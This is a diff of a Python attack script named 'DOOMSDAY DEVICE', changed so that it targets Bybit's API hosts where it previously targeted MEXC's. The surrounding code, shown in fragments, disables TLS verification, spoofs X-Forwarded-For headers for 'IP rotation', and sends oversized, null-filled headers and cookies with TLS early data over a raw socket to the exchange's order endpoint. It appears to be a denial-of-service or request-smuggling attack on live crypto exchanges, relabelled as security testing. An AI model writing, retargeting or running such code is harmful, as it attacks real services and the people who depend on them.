@@ -25,12 +25,12 @@ class MEXCDoomsdayDevice:
     def __init__(self, api_key, api_secret):
         self.api_key = api_key
         self.api_secret = api_secret
-        self.base_url = "https://api.mexc.com"
-        self.ws_url = "wss://wbs.mexc.com/raw/ws"
+        self.base_url = "https://api.bybit.com"
+        self.ws_url = "wss://wbs.bybit.com/raw/ws"
         self._session = requests.Session()
         self._session.verify = False  # TLS bypass for testing
         self._session.headers.update({
-            'User-Agent': 'MEXC-SECURITY-TESTING/7.1',
+            'User-Agent': 'bybit-SECURITY-TESTING/7.1',
             'X-Forwarded-For': '192.168.0.' + str(os.getpid() % 255)  # IP rotation
         })
 
@@ -102,7 +102,7 @@ class MEXCDoomsdayDevice:
         headers = [
             (':method', 'POST'),
             (':path', '/api/v3/order?' + urlencode(params)),
-            (':authority', 'api.mexc.com'),
+            (':authority', 'api.bybit.com'),
             ('x-custom-header', '\x00'.join(['X'*4096]*10)),
             ('cookie', ';'.join(f'{i}=a'*8000 for i in range(50))),
             ('early-data', '1'),  # TLS 1.3 0-RTT
@@ -117,8 +117,8 @@ class MEXCDoomsdayDevice:
         
         ctx = ssl.create_default_context()
         ctx.set_ciphers('TLS_AES_128_GCM_SHA256')
-        with socket.create_connection(("api.mexc.com", 443)) as sock:
-            with ctx.wrap_socket(sock, server_hostname="api.mexc.com") as ssock:
+        with socket.create_connection(("api.bybit.com", 443)) as sock:
+            with ctx.wrap_socket(sock, server_hostname="api.bybit.com") as ssock:
                 ssock.send(payload)
                 return ssock.recv(8192).decode(errors='ignore')
 
@@ -224,7 +224,7 @@ class MEXCDoomsdayDevice:
         return results
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='MEXC DOOMSDAY DEVICE v7.1')
+    parser = argparse.ArgumentParser(description='bybit DOOMSDAY DEVICE v7.1')
     parser.add_argument('--api-key', required=True, help='API key')
     parser.add_argument('--api-secret', required=True, help='API secret')
     parser.add_argument('--symbol', default='BTCUSDT', help='Trading pair')
